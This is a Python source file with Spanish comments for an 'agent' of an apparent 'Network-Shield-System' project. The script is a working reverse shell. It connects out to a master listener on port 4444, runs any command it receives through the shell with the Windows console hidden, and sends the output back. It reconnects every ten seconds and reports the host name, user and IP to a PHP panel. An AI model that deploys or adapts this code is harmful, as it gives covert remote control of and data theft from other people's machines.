import socket
import subprocess
import os
import sys
import time
import requests

# CONFIGURACIÓN
# Si usas XAMPP en el mismo PC, 'localhost' está bien. 
# Si el receptor está en otro PC, pon su IP privada (ej: 192.168.1.15).
HOST = 'localhost'  
PORT = 4444
URL_REPORTE = 'http://localhost/Network-Shield-System/server/actualizar_estado.php'

def obtener_datos():
    """Recopila información básica del sistema para el panel web."""
    try:
        nombre_pc = os.environ.get('COMPUTERNAME', 'Unknown-PC')
        usuario = os.getlogin()
        # Intentamos obtener la IP interna real
        s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_temp.connect(("8.8.8.8", 80))
        ip_local = s_temp.getsockname()[0]
        s_temp.close()
    except:
        ip_local = '127.0.0.1'
        nombre_pc = 'Local-PC'
        usuario = 'Admin'
    
    return ip_local, f"{nombre_pc} ({usuario})"

def reportar_a_base_de_datos():
    """Registra la presencia del agente en la DB via PHP."""
    ip, nombre = obtener_datos()
    try:
        payload = {
            'ip': ip,
            'nombre': nombre,
            'os': sys.platform
        }
        # Timeout corto para no bloquear el agente si la web no responde
        requests.post(URL_REPORTE, data=payload, timeout=3)
    except:
        pass 

def iniciar_agente():
    # El reporte se hace en un bucle para confirmar que sigue vivo cada cierto tiempo
    reportar_a_base_de_datos()
    
    while True:
        try:
            # Crear socket y conectar al receptor (Master)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            while True:
                data = s.recv(10240)
                if not data: 
                    break
                
                comando = data.decode('latin-1', errors='ignore').strip()

                if comando.lower() == "exit":
                    s.close()
                    sys.exit(0)

                # --- Lógica de navegación (CD) ---
                if comando.lower().startswith("cd "):
                    try:
                        destino = comando[3:].strip().strip('"')
                        os.chdir(destino)
                        respuesta = f"[+] Directorio actual: {os.getcwd()}"
                    except Exception as e:
                        respuesta = f"[-] Error: {str(e)}"
                    s.send(respuesta.encode('latin-1'))
                    continue

                # --- Ejecución de comandos (Oculto) ---
                # creationflags=0x08000000 oculta la consola en Windows
                proc = subprocess.Popen(
                    comando, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE,
                    creationflags=0x08000000 if os.name == 'nt' else 0
                )
                
                stdout, stderr = proc.communicate()
                salida = stdout + stderr

                if not salida:
                    s.send(b"Comando ejecutado (sin salida de texto).")
                else:
                    s.send(salida)

        except (socket.error, ConnectionRefusedError):
            # Si el receptor no está escuchando, esperar y reintentar
            time.sleep(10)
            # Re-intentar reporte a la DB por si cambió algo
            reportar_a_base_de_datos()
            continue
        except Exception:
            time.sleep(10)
            continue

if __name__ == "__main__":
    iniciar_agente()